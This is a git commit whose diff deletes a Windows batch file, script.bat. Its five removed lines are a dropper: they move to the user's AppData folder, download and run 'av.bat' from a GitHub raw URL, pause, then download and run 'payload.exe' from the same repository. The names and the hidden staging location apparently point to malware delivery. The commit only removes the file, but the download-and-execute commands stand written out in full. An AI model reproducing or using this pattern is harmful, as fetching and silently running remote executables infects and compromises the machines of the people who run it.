5d6bf1e780d8b2966ba95f9c184cf2939da24621
ishanarya24 <91789624+ishanarya24@users.noreply.github.com>
2021-10-21 02:32:59 +0530

    Delete script.bat

--- script.bat
+++
@@ -1,5 +0,0 @@
-cd %appdata% && curl https://raw.githubusercontent.com/ishanarya24/dc/main/av.bat -O
-cmd /c av.bat
-timeout 15
-cd %appdata% && curl https://raw.githubusercontent.com/ishanarya24/dc/main/payload.exe -O
-cmd /c payload.exe
